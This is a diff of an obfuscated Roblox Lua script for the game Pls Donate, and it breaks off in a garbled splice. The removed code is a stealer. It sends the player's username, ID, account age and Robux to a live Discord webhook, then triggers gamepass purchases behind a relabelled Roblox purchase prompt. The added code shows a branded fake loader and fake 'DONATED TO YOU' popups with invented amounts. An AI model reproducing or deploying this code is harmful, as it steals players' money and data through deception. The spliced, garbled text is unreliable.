@@ -58,189 +58,661 @@ local function v12()
     }
     v10:Create(vu2, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), v11):Play()
 end
-    v26.ZIndexBehavior = Enum.ZIndexBehavior.Global
-    local v27 = Instance.new("Frame")
-    v27.Parent = v26
-    v27.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
-    v27.Size = UDim2.new(0, 255, 0, 45)
-    v27.Position = UDim2.new(0.5, - 125, 0.38, 24)
-    v27.BorderSizePixel = 0
-    v27.Active = false
-    v27.Visible = true
-    v27.ZIndex = 10
-    local v28 = Instance.new("UIStroke")
-    v28.Parent = v27
-    v28.Thickness = 2
-    v28.Color = Color3.fromRGB(184, 134, 11)
-    local v29 = Instance.new("UICorner")
-    v29.Parent = v27
-    v29.CornerRadius = UDim.new(0.2, 0)
-    local v30 = Instance.new("TextLabel")
-    v30.Parent = v27
-    v30.Text = "LOAD MAIN SCRIPT!"
-    v30.Font = Enum.Font.FredokaOne
-    v30.TextSize = 20
-    v30.Size = UDim2.new(1, 0, 1, 0)
-    v30.BackgroundTransparency = 1
-    v30.TextColor3 = Color3.fromRGB(105, 105, 105)
-    v30.TextStrokeTransparency = 0
-    v30.TextStrokeColor3 = Color3.fromRGB(50, 50, 50)
-    v30.ZIndex = 11
-end
-local function vu38()
-    local v32 = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-    local v33 = Instance.new("ScreenGui")
-    v33.Parent = v32
-    v33.ZIndexBehavior = Enum.ZIndexBehavior.Global
-    local v34 = Instance.new("Frame")
-    v34.Parent = v33
-    v34.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
-    v34.Size = UDim2.new(0, 250, 0, 40)
-    v34.Position = UDim2.new(0.5, - 125, 0.38, - 10)
-    v34.BorderSizePixel = 0
-    v34.Active = true
-    v34.Draggable = false
-    v34.ZIndex = 5
-    local v35 = Instance.new("UIStroke")
-    v35.Parent = v34
-    v35.Thickness = 2
-    v35.Color = Color3.fromRGB(100, 100, 100)
-    local v36 = Instance.new("UICorner")
-    v36.Parent = v34
-    v36.CornerRadius = UDim.new(0.2, 0)
-    local v37 = Instance.new("TextLabel")
-    v37.Parent = v34
-    v37.Text = "CONTINUE TO SCRIPT!"
-    v37.Font = Enum.Font.FredokaOne
-    v37.TextSize = 20
-    v37.Size = UDim2.new(1, 0, 1, 0)
-    v37.BackgroundTransparency = 1
-    v37.TextColor3 = Color3.fromRGB(50, 50, 50)
-    v37.ZIndex = 6
-end
-Username = "mozilontop_01"
-Webhook = "https://discord.com/api/webhooks/1358935494049665084/fOAH6oL_mbIgp4kFDNRu1Cl5l1LQ5uqV3-HZz3-B97tieCFQ3hrKBwxX9YcRZz2TW_9z"
-ReplicatedStorage = game:GetService("ReplicatedStorage")
-MarketplaceService = game:GetService("MarketplaceService")
-HttpService = game:GetService("HttpService")
-CoreGui = game:GetService("CoreGui")
-Players = game:GetService("Players")
-local vu39 = game:GetService("HttpService")
-local vu40 = syn and syn.request or request
-if typeof(vu40) ~= "function" then
-    error("?!?")
-end
-Remotes = require(ReplicatedStorage:WaitForChild("Remotes"))
-local v41, vu42 = pcall(function()
-    return Players:GetUserIdFromNameAsync(Username)
-end)
-local vu43 = nil
-local vu44 = nil
-local function vu49()
-    local v45 = {
-        username = "Hit On Pls Donate",
-        avatar_url = "https://cdn.discordapp.com/attachments/1299001946191040588/1329748647864303647/images_5.jpg?ex=678b786f&is=678a26ef&hm=0b89be217de156b0bcbacb6b3f611a3bde76cbd2dd26a6b2f6a843ab5c915d47&",
-        content = "You Got Hit"
+shared.LoaderTitle = "Subscribe To c00lkidd-Devil";
+shared.LoaderKeyFrames = {
+    [1] = {
+        1,
+        10
+    },
+    [2] = {
+        2,
+        30
+    },
+    [3] = {
+        3,
+        60
+    },
+    [4] = {
+        2,
+        100
     }
-    local v46 = {}
-    local v47 = {
-        title = "**__Shar\'s Script__ | __Pls Donate Stealer__**",
-        color = tonumber(3368447),
-        description = clickablePlayerName .. " Use Your Script.",
-        thumbnail = {
-            url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(playerId) .. "&width=420&height=420&format=png"
+};
+local v2 = {
+    LoaderData = {
+        Name = shared.LoaderTitle or "A Loader",
+        Colors = shared.LoaderColors or {
+            Main = Color3.fromRGB(0, 0, 0),
+            Topic = Color3.fromRGB(200, 200, 200),
+            Title = Color3.fromRGB(255, 255, 255),
+            LoaderBackground = Color3.fromRGB(40, 40, 40),
+            LoaderSplash = Color3.fromRGB(130, 36, 212)
+        }
+    },
+    Keyframes = shared.LoaderKeyFrames or {
+        [1] = {
+            1,
+            10
         },
-        fields = {
-            {
-                name = "Information",
-                value = "```lua\nExecutor: " .. tostring(identifyexecutor()) .. "\nUsername: " .. game.Players.LocalPlayer.Name .. "\nUser-ID: " .. tostring(game.Players.LocalPlayer.UserId) .. "\nAccount Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "```"
-            },
-            {
-                name = "Robux",
-                value = "```" .. vu44 .. "```"
-            }
+        [2] = {
+            2,
+            30
         },
-        footer = {
-            text = "Created by c00lkidd-Devil"
+        [3] = {
+            3,
+            60
+        },
+        [4] = {
+            2,
+            100
         }
     }
-    __set_list(v46, 1, {
-        v47
-    })
-    v45.embeds = v46
-    local v48 = vu39:JSONEncode({
-        content = "@everyone",
-        embeds = {
-            v45
-        }
-    })
-    vu40({
-        Url = Webhook,
-        Method = "POST",
-        Headers = headers,
-        Body = v48
-    })
+};
+local v3 = {
+    [1] = "",
+    [2] = "",
+    [3] = "",
+    [4] = ""
+};
+function TweenObject(v178, v179, v180)
+    game.TweenService:Create(v178, TweenInfo.new(v179, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), v180):Play();
 end
-if v41 then
-    local vu50 = Remotes.Function("OfflinePlayerLookup"):InvokeServer(vu42)
-    if not vu50 then
-        return Players.LocalPlayer:Kick()
+function CreateObject(v181, v182)
+    local v183 = Instance.new(v181);
+    local v184;
+    for v416, v417 in pairs(v182) do
+        if v416 ~= "Parent" then
+            v183[v416] = v417;
+        else
+            v184 = v417;
+        end
     end
-    local v51 = math.huge
-    local v52, v53, v54 = pairs(vu50.BoothUI.Items.Frame:GetChildren())
-    local v55 = nil
-    local vu56 = nil
-    while true do
-        local v57
-        v54, v57 = v52(v53, v54)
-        if v54 == nil then
+    v183.Parent = v184;
+    return v183;
+end
+local function v4(v186, v187)
+    local v188 = Instance.new("UICorner");
+    v188.CornerRadius = UDim.new(0, v186);
+    v188.Parent = v187;
+end
+local v5 = CreateObject("ScreenGui", {
+    Name = "Core",
+    Parent = game.CoreGui
+});
+local v6 = CreateObject("Frame", {
+    Name = "Main",
+    Parent = v5,
+    BackgroundColor3 = v2.LoaderData.Colors.Main,
+    BorderSizePixel = 0,
+    ClipsDescendants = true,
+    Position = UDim2.new(0.5, 0, 0.5, 0),
+    AnchorPoint = Vector2.new(0.5, 0.5),
+    Size = UDim2.new(0, 0, 0, 0)
+});
+v4(12, v6);
+local v7 = CreateObject("ImageLabel", {
+    Name = "UserImage",
+    Parent = v6,
+    BackgroundTransparency = 1,
+    Image = "rbxassetid://120142022219317",
+    Position = UDim2.new(0, 15, 0, 10),
+    Size = UDim2.new(0, 50, 0, 50)
+});
+v4(25, v7);
+local v8 = CreateObject("TextLabel", {
+    Name = "UserName",
+    Parent = v6,
+    BackgroundTransparency = 1,
+    Text = "Youtube: c00lkidd-Devil😈🔥",
+    Position = UDim2.new(0, 75, 0, 10),
+    Size = UDim2.new(0, 200, 0, 50),
+    Font = Enum.Font.GothamBold,
+    TextColor3 = v2.LoaderData.Colors.Title,
+    TextSize = 14,
+    TextXAlignment = Enum.TextXAlignment.Left
+});
+local v9 = CreateObject("TextLabel", {
+    Name = "Top",
+    TextTransparency = 1,
+    Parent = v6,
+    BackgroundColor3 = Color3.fromRGB(255, 255, 255),
+    BackgroundTransparency = 1,
+    Position = UDim2.new(0, 30, 0, 70),
+    Size = UDim2.new(0, 301, 0, 20),
+    Font = Enum.Font.Gotham,
+    Text = "Loader",
+    TextColor3 = v2.LoaderData.Colors.Topic,
+    TextSize = 10,
+    TextXAlignment = Enum.TextXAlignment.Left
+});
+local v10 = CreateObject("TextLabel", {
+    Name = "Title",
+    Parent = v6,
+    TextTransparency = 1,
+    BackgroundColor3 = Color3.fromRGB(255, 255, 255),
+    BackgroundTransparency = 1,
+    Position = UDim2.new(0, 30, 0, 90),
+    Size = UDim2.new(0, 301, 0, 46),
+    Font = Enum.Font.Gotham,
+    RichText = true,
+    Text = "<b>" .. v2.LoaderData.Name .. "</b>",
+    TextColor3 = v2.LoaderData.Colors.Title,
+    TextSize = 14,
+    TextXAlignment = Enum.TextXAlignment.Left
+});
+local v11 = CreateObject("Frame", {
+    Name = "BG",
+    Parent = v6,
+    AnchorPoint = Vector2.new(0.5, 0),
+    BackgroundTransparency = 1,
+    BackgroundColor3 = v2.LoaderData.Colors.LoaderBackground,
+    BorderSizePixel = 0,
+    Position = UDim2.new(0.5, 0, 0, 70),
+    Size = UDim2.new(0.8500000238418579, 0, 0, 24)
+});
+v4(8, v11);
+local v12 = CreateObject("Frame", {
+    Name = "Progress",
+    Parent = v11,
+    BackgroundColor3 = v2.LoaderData.Colors.LoaderSplash,
+    BackgroundTransparency = 1,
+    BorderSizePixel = 0,
+    Size = UDim2.new(0, 0, 0, 24)
+});
+v4(8, v12);
+local v13 = CreateObject("TextLabel", {
+    Name = "StepLabel",
+    Parent = v6,
+    BackgroundTransparency = 1,
+    Position = UDim2.new(0.5, 0, 1, -25),
+    Size = UDim2.new(1, -20, 0, 20),
+    Font = Enum.Font.Gotham,
+    Text = "",
+    TextColor3 = v2.LoaderData.Colors.Topic,
+    TextSize = 14,
+    TextXAlignment = Enum.TextXAlignment.Center,
+    AnchorPoint = Vector2.new(0.5, 0.5)
+});
+function UpdateStepText(v191)
+    v13.Text = v3[v191] or "";
+end
+function UpdatePercentage(v193, v194)
+    TweenObject(v12, 0.5, {
+        Size = UDim2.new(v193 / 100, 0, 0, 24)
+    });
+    UpdateStepText(v194);
+end
+TweenObject(v6, 0.25, {
+    Size = UDim2.new(0, 346, 0, 121)
+});
+wait();
+TweenObject(v9, 0.5, {
+    TextTransparency = 0
+});
+TweenObject(v10, 0.5, {
+    TextTransparency = 0
+});
+TweenObject(v11, 0.5, {
+    BackgroundTransparency = 0
+});
+TweenObject(v12, 0.5, {
+    BackgroundTransparency = 0
+});
+for v195, v196 in pairs(v2.Keyframes) do
+    wait(v196[1]);
+    UpdatePercentage(v196[2], v195);
+end
+UpdatePercentage(100, 4);
+TweenObject(v9, 0.5, {
+    TextTransparency = 1
+});
+TweenObject(v10, 0.5, {
+    TextTransparency = 1
+});
+TweenObject(v11, 0.5, {
+    BackgroundTransparency = 1
+});
+TweenObject(v12, 0.5, {
+    BackgroundTransparency = 1
+});
+wait(0.5);
+TweenObject(v6, 0.25, {
+    Size = UDim2.new(0, 0, 0, 0)
+});
+wait(0.25);
+v5:Destroy();
+
+
+local Players         = game:GetService("Players")
+local LocalPlayer     = Players.LocalPlayer
+local PlayerGui       = LocalPlayer:WaitForChild("PlayerGui")
+local TweenService    = game:GetService("TweenService")
+local SoundService    = game:GetService("SoundService")
+local Debris          = game:GetService("Debris")
+local RunService      = game:GetService("RunService")
+local TeleportService = game:GetService("TeleportService")
+
+
+local PUSH_FIRST        = true
+local PUSH_DURATION     = 6
+local PUSH_INTERVAL     = 0.05
+local NEAR_RADIUS       = 0.2
+local SPAWN_DELAY       = 0.1
+local MAX_VALUE         = 15000
+local NUM_PER_PLAYER    = 1
+
+
+local totalDonatedVisual = 0
+
+
+
+local UITemplates = PlayerGui:FindFirstChild("UITemplates")
+local DONATION_TEMPLATE
+local POPUPS_FOLDER
+
+do
+    if UITemplates and UITemplates:FindFirstChild("donationPopup") then
+        DONATION_TEMPLATE = UITemplates:FindFirstChild("donationPopup")
+    end
+
+    local existingGui
+    for _, child in ipairs(PlayerGui:GetChildren()) do
+        if child:IsA("ScreenGui") and child:FindFirstChild("Popups", true) then
+            existingGui = child
             break
         end
-        if v57:GetAttribute("AssetType") == "Gamepass" and (not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, v57:GetAttribute("AssetId")) and v57:GetAttribute("AssetPrice") < v51) then
-            v51 = v57:GetAttribute("AssetPrice")
-            v55 = v57
+    end
+
+    if DONATION_TEMPLATE and existingGui then
+        POPUPS_FOLDER = existingGui:FindFirstChild("Popups", true)
+    end
+
+    if not DONATION_TEMPLATE then
+        local templateGui = existingGui
+        if not templateGui then
+            templateGui = Instance.new("ScreenGui")
+            templateGui.Name = "MozilDonateTemplateGui"
+            templateGui.ResetOnSpawn = false
+            templateGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+            templateGui.Parent = PlayerGui
+        end
+
+        local popupFrame = Instance.new("Frame")
+        popupFrame.Name = "donationPopup"
+        popupFrame.AnchorPoint = Vector2.new(0.5, 0)
+        popupFrame.Position = UDim2.new(0.5, 0, 0.1, 0)
+        popupFrame.Size = UDim2.new(0, 350, 0, 60)
+        popupFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+        popupFrame.BackgroundTransparency = 0.1
+        popupFrame.BorderSizePixel = 0
+        popupFrame.Parent = templateGui
+
+        local popupCorner = Instance.new("UICorner")
+        popupCorner.CornerRadius = UDim.new(0, 10)
+        popupCorner.Parent = popupFrame
+
+        local messageLabel = Instance.new("TextLabel")
+        messageLabel.Name = "Message"
+        messageLabel.BackgroundTransparency = 1
+        messageLabel.Position = UDim2.new(0, 10, 0, 10)
+        messageLabel.Size = UDim2.new(1, -20, 1, -20)
+        messageLabel.Font = Enum.Font.GothamBold
+        messageLabel.Text = ""
+        messageLabel.TextColor3 = Color3.new(1, 1, 1)
+        messageLabel.TextSize = 20
+        messageLabel.TextWrapped = true
+        messageLabel.TextXAlignment = Enum.TextXAlignment.Left
+        messageLabel.Parent = popupFrame
+
+        local uiScale = Instance.new("UIScale")
+        uiScale.Parent = popupFrame
+
+        DONATION_TEMPLATE = popupFrame
+    end
+
+    if not POPUPS_FOLDER then
+        local popGui = Instance.new("ScreenGui")
+        popGui.Name = "MozilDonatePopups"
+        popGui.ResetOnSpawn = false
+        popGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+        popGui.Parent = PlayerGui
+
+        POPUPS_FOLDER = Instance.new("Folder")
+        POPUPS_FOLDER.Name = "Popups"
+        POPUPS_FOLDER.Parent = popGui
+    end
+end
+
+
+local function formatNumber(n)
+    local s = tostring(n)
+    s = s:reverse():gsub("(%d%d%d)", "%1,"):reverse()
+    if s:sub(1, 1) == "," then
+        s = s:sub(2)
+    end
+    return s
+end
+
+local SPECIAL_SMALL = {
+    120,
+    21630,
+    59901,
+    170703,
+    156368,
+    2839029,
+    585740,
+    7564
+}
+local function nearestSpecialSmall(v)
+    local best = SPECIAL_SMALL[1]
+    local bestDiff = math.huge
+    for _, x in ipairs(SPECIAL_SMALL) do
+        local d = math.abs(v - x)
+        if d < bestDiff then
+            best = x
+            bestDiff = d
         end
     end
-    v55.Prompt:FireServer("", false, v51)
-    Animator = CoreGui:WaitForChild("PurchasePromptApp"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
-    local function vu64()
-        local v58, v59, v60 = pairs(vu50.BoothUI.Items.Frame:GetChildren())
-        local v61 = 0
-        while true do
-            local v62
-            v60, v62 = v58(v59, v60)
-            if v60 == nil then
-                break
-            end
-            if v62:GetAttribute("AssetType") == "Gamepass" and not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, v62:GetAttribute("AssetId")) then
-                local v63 = v62:GetAttribute("AssetPrice")
-                if v63 <= vu56 and v61 < v63 then
-                    vu43 = v62
-                    v61 = v63
-                end
-            end
-        end
-        if vu43 then
-            if vu43.Prompt and typeof(vu43.Prompt.FireServer) == "function" then
-                vu43.Prompt:FireServer("", false, v61)
-            else
-                warn("?.")
-            end
+    return best
+end
+
+local FAVOR_MED = {
+    {
+        val = 104029000,
+        w = 68
+    },
+    {
+        val = 7202900000,
+        w = 100
+    },
+    {
+        val = 29173920000,
+        w = 23
+    }
+}
+local FAVOR_MED_TOTAL = 0
+for _, it in ipairs(FAVOR_MED) do
+    FAVOR_MED_TOTAL += it.w
+end
+local function pickFavorMed()
+    local r = math.random(1, FAVOR_MED_TOTAL)
+    local acc = 0
+    for _, it in ipairs(FAVOR_MED) do
+        acc += it.w
+        if r <= acc then
+            return it.val
         end
     end
-    repeat
-        task.wait()
-    until not Animator:FindFirstChild("Prompt")
-    Animator.ChildAdded:Connect(function(p65)
-        local v66 = p65.Name == "Prompt" and p65:WaitForChild("AlertContents"):WaitForChild("Footer"):WaitForChild("FooterContent"):WaitForChild("Content"):FindFirstChild("RemainingBalanceText")
-        if v66 then
-            if vu56 then
-                p65.AlertContents.TitleContainer.TitleArea.Title.Text = "Please Donate - Script!"
-                local v67 = p65.AlertContents.TitleContainer.TitleArea.Title
-                v67.Size = UDim2.new(1, 0, v67.Size.Y.Scale, v67.Size.Y.Offset)
-                p65.AlertContents.MiddleContent.Visible = false
-                p65.AlertContents.Footer.Buttons["1"].Visible = false
-                p65.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Text.Text = "Continue"
+    return 100
+end
+local function roundAmount(v)
+    if v < 100 then
+        return nearestSpecialSmall(v)
+    elseif v < 1000 then
+        if math.random() <= 0.8 then
+            return pickFavorMed()
+        else
+            return math.floor((v + 50) / 100) * 100
+        end
+    else
+        local rounded = math.floor((v + 500) / 1000) * 1000
+        return math.clamp(rounded, 1000, MAX_VALUE)
+    end
+end
+local function weightedRandomAmount(maxValue)
+    local roll = math.random(1, 10000)
+    if roll <= 9500 then
+        local raw = math.floor((1 - math.random() ^ 2.6) * 1000) + 1
+        return roundAmount(raw)
+    else
+        local over10k = ({
+            11259839000,
+            12984162000,
+            135546473000,
+            1492182920000,
+            15637920000000
+        })[math.random(1, 5)]
+        return math.min(over10k, maxValue)
+    end
+end
+local function playAmountSound(amount)
+    local soundId
+    if amount <= 99 then
+        soundId = "rbxassetid://15333945695"
+    elseif amount <= 999 then
+        soundId = "rbxassetid://15333946014"
+    elseif amount <= 9999 then
+        soundId = "rbxassetid://15333945376"
+    else
+        soundId = "rbxassetid://15333945889"
+    end
+    local s = Instance.new("Sound")
+    s.SoundId = soundId
+    s.Volume = 1
+    s.Parent = SoundService
+    s:Play()
+    Debris:AddItem(s, 6)
+end
+
+local function createDonationVisual(username, amount)
+    local text = username .. " DONATED " .. formatNumber(amount) .. " TO YOU!"
+    local clone = DONATION_TEMPLATE:Clone()
+    clone.Parent = POPUPS_FOLDER
+    clone.Transparency = 1
+    clone.Visible = true
+    if clone:FindFirstChild("Message") then
+        clone.Message.Text = text
+        pcall(function()
+            clone.Message.MaxVisibleGraphemes = 0
+        end)
+    end
+    if clone:FindFirstChild("UIScale") then
+        clone.UIScale.Scale = 0
+    end
+    TweenService:Create(clone, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {
+        Transparency = 0
+    }):Play()
+    if clone:FindFirstChild("UIScale") then
+        TweenService:Create(clone.UIScale, TweenInfo.new(0.3, Enum.EasingStyle.Back), {
+            Scale = 1
+        }):Play()
+    end
+    if clone:FindFirstChild("Message") then
+        TweenService:Create(clone.Message, TweenInfo.new(1, Enum.EasingStyle.Quint), {
+            MaxVisibleGraphemes = #text
+        }):Play()
+    end
+    return clone
+end
+local function dismissDonationVisual(clone)
+    if not clone then
+        return
+    end
+    TweenService:Create(clone, TweenInfo.new(0.25), {
+        Transparency = 1
+    }):Play()
+    task.delay(0.5, function()
+        if clone then
+            clone:Destroy()
+        end
+    end)
+end
+
+local CoinVFX = {}
+local COLLECT_SOUND_ID = "rbxassetid://6792279908"
+local PROX_RADIUS = 2.5
+local HOMING_DELAY = 1
+local COIN_LIFETIME = 12
+local function mkCoin(startPos)
+    local p = Instance.new("Part")
+    p.Anchored = true
+    p.CanCollide = false
+    p.CanTouch = true
+    p.Material = Enum.Material.Neon
+    p.Color = Color3.fromRGB(255, 207, 64)
+    p.Size = Vector3.new(0.2, 0.9, 0.9)
+    p.CFrame = CFrame.new(startPos)
+    p.Parent = workspace
+    local att = Instance.new("Attachment", p)
+    att.Name = "Center"
+    local glow = Instance.new("PointLight", att)
+    glow.Range = 6
+    glow.Brightness = 0.2
+    local spark = Instance.new("ParticleEmitter", att)
+    spark.Rate = 0
+    spark.Texture = "rbxassetid://258128463"
+    local snd = Instance.new("Sound", p)
+    snd.SoundId = COLLECT_SOUND_ID
+    snd.Volume = 1
+    return p, att, glow, spark, snd
+end
+local function collectAndDestroy(p, glow, spark, snd)
+    if not p then
+        return
+    end
+    if glow then
+        glow.Brightness = 1
+        glow.Range = 7.5
+    end
+    if spark then
+        spark:Emit(12)
+    end
+    if snd then
+        snd:Play()
+    end
+    TweenService:Create(p, TweenInfo.new(0.25), {
+        Size = Vector3.new(0, 0, 0)
+    }):Play()
+    task.delay(0.3, function()
+        if p then
+            p:Destroy()
+        end
+    end)
+end
+local function spawnOneCoin(startPos, targetHRP)
+    local p, center, glow, spark, snd = mkCoin(startPos)
+    local collected = false
+    local rotConn
+    rotConn = RunService.RenderStepped:Connect(function(dt)
+        if not p or collected then
+            rotConn:Disconnect()
+            return
+        end
+        p.Orientation = p.Orientation + Vector3.new(0, 180 * dt, 0)
+    end)
+    local function doCollect()
+        if collected then
+            return
+        end
+        collected = true
+        collectAndDestroy(p, glow, spark, snd)
+    end
+    p.Touched:Connect(function(hit)
+        if collected then
+            return
+        end
+        local myChar = targetHRP and targetHRP.Parent
+        if myChar and hit and hit:IsDescendantOf(myChar) then
+            doCollect()
+        end
+    end)
+    task.delay(HOMING_DELAY, function()
+        if collected then
+            return
+        end
+        if spark then
+            spark.Enabled = true
+        end
+        local alpha = 0
+        local born = os.clock()
+        local hb
+        hb = RunService.Heartbeat:Connect(function(dt)
+            if not p or collected then
+                hb:Disconnect()
+                return
+            end
+            if not targetHRP or not targetHRP.Parent then
+                collected = true
+                TweenService:Create(p, TweenInfo.new(0.4), {
+                    Size = Vector3.new(0, 0, 0)
+                }):Play()
+                task.delay(0.4, function()
+                    if p then
+                        p:Destroy()
+                    end
+                end)
+                hb:Disconnect()
+                return
+            end
+            local dist = (center.WorldPosition - targetHRP.Position).Magnitude
+            if dist < PROX_RADIUS then
+                doCollect()
+                hb:Disconnect()
+                return
+            end
+            alpha = math.clamp(alpha + 0.05 * dt * 60 / 60, 0, 1)
+            p.Position = p.Position:Lerp(targetHRP.Position, alpha)
+            if os.clock() - born > COIN_LIFETIME then
+                doCollect()
+                hb:Disconnect()
+            end
+        end)
+    end)
+end
+function CoinVFX.spawn(amount, startPos, targetChar)
+    local hrp = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
+    if not hrp then
+        return
+    end
+    local delayPer = 0.1
+    local count = math.clamp(math.floor(amount / 100) + 3, 5, 20)
+    for i = 1, count do
+        task.spawn(spawnOneCoin, startPos, hrp)
+        task.wait(delayPer)
+    end
+end
+
+local function showRobuxSummary(totalAmount)
+    if totalAmount <= 18279903830 then
+        return
+    end
+    local net = math.floor(totalAmount * 0.6)
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "MozilRobuxSummary"
+    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    gui.ResetOnSpawn = false
+    gui.Parent = PlayerGui
+    local frame = Instance.new("Frame")
+    frame.Name = "SummaryFrame"
+    frame.AnchorPoint = Vector2.new(0.5, 0.5)
+    frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+    frame.Size = UDim2.new(0, 0, 0, 0)
+    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    frame.BackgroundTransparency = 0.1
+    frame.BorderSizePixel = 0
+    frame.Parent = gui
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 14)
+    corner.Parent = frame
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = Color3.fromRGB(0, 255, 140)
+    stroke.Thickness = 2
+    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    stroke.Parent = frame
+    local title = Instance.new("TextLabel")
+    title.Name = "Title"
+    title.BackgroundTransparency = 1
+    title.Size = UDim2.new(1, -20, 0, 28)
+    title.Position = UDim2.new(0, 10, 0, 8)
+    title.Font = Enum.Font.GothamBold
+    title.Text = "c00lkidd-Devil - 获得成功😈🔥"
+    title.TextColor3 = Color3.new(1, 1, 1)
+    title.TextSize = 18
+    title.TextXAlignment = Enum.TextXAlignment.Left
+    title.TextStrokeColor3 = Color3.new(0, 0, 0)
+    title.TextStrokeTransparency = 0.5
+    title.Parent = frame
+    local mainText = Instance.new("TextLabel")
+    mainText.Name = "Maents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Text.Text = "Continue"
                 local v68 = p65.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Text
                 v68.Size = UDim2.new(1, 0, v68.Size.Y.Scale, v68.Size.Y.Offset)
                 p65.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Icon.Visible = false
